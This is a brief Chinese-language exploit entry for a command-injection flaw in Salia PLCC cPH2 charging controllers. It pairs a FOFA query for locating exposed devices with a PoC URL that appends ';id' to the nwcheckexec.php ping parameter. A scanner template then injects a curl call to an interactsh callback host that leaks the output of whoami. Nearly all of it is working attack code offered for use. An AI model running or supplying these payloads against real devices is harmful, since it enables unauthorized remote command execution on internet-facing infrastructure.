# Salia PLCC cPH2 远程命令执行漏洞

## fofa
```
"Salia PLCC"
```

## poc
```
/nwcheckexec.php?type=ping&dest=8.8.8.8;id
```

```
http:
  - method: GET
    path:
      - "{{BaseURL}}/nwcheckexec.php?ip={{url_encode('127.0.0.1 && curl http://$(whoami).{{interactsh-url}}')}}"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<b>SUCCESS</b>"
          - "127.0.0.1 && curl http://$(whoami).{{interactsh-url}}"
        condition: and

      - type: status
        status:
          - 200

      - type: word
        part: interactsh_protocol
        words:
          - "dns"
# digest: 4a0a00473045022068ef983fa81262636ea41ef1e73a41004e64f96e9a0bf31555de76a92984a911022100851ff91914ba0856c3e59c01d679b4f5076ed7f404cb50efe363eb43f19ec7b3:922c64590222798bb761d5b6d8e72950
```
